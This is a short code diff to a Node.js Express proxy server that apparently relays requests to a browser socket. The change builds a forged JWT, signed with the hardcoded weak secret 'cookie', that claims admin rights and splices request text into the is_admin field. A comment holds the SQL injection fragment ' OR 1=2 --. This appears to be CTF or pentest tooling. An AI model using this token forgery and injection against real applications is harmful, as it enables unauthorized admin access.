@@ -8,6 +8,8 @@ const usersRouter = require('./routes/users');
 const cors = require('cors')
 // var bodyParser = require('body-parser')
 const getRawBody = require('raw-body')
+const jwt = require('jwt-simple');
+const secret = "cookie";
 
 const mongojs = require('mongojs')
 const db = mongojs('queriesdb', ['queries'])
@@ -112,9 +114,16 @@ async function waitforit(_id, res) {
 
 app.post('/proxy', function (req, res) {
 
+    let payload=
+        {"id":"1337","username":"guest","password":"h4x0r","email":"guest@where.ever","is_admin":"yes" + req.text};
+
+    // ' OR 1=2 --
+    let pwn = jwt.encode(payload, secret);
+    // let pwn = req.text;
+
     // insert into mongo. get the _id
     const query = {
-        text: req.text,
+        text: pwn,
         create_time: new Date(),
         has_ran: 'init'
     };
@@ -122,7 +131,7 @@ app.post('/proxy', function (req, res) {
     db.queries.insert(query, function (err, http) {
         if (chromeSocket) {
             chromeSocket.emit("mensaje", {
-                text: req.text,
+                text: pwn,
                 id: http._id,
                 contentType: req.headers['content-type']
             });
